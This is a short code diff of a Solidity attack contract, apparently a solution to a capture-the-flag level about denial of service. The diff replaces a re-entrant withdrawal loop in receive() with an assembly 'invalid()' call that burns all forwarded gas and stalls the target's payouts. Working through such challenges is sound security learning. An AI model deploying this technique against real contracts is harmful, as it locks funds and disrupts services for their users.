@@ -1,7 +1,6 @@
-// SPDX-License-Identifier: MIT
+// SPDX-License-Identifier: MIT 
 pragma solidity ^0.8.0;
 
-import "./20-denial.sol";
 import "interfaces/idenial.sol";
 
 contract Attack20 {
@@ -20,12 +19,9 @@ contract Attack20 {
     }
 
     receive() external payable{
-        uint256 targetBalance = address(target).balance;
-
-        if (targetBalance > 0 ether) {
-            this.attack();
+        assembly {
+            invalid()
         }
     }
-
 }
 
